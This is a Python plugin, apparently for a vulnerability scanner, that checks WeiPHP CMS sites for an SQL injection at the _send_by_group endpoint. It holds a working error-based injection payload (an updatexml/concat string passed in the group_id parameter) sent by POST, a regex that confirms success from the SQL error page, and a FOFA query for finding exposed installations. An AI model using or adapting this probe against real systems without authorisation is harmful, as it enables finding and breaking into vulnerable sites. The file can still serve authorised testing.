#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/G_4GfwBjeityLsSJrqTOEw',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'weiphp cms _send_by_group sql注入',

      'level'     :   'high',

      'FOFA'      :   'body="/css/weiphp.css" || body="WeiPHP"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/24',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/public/index.php/weixin/message/_send_by_group'
  data = f'group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+--'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,data=data,verify=False)
    if res.status_code == 500 and re.search(r'Error SQL.*?SELECT.*?FROM.*?hostname.*?database',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret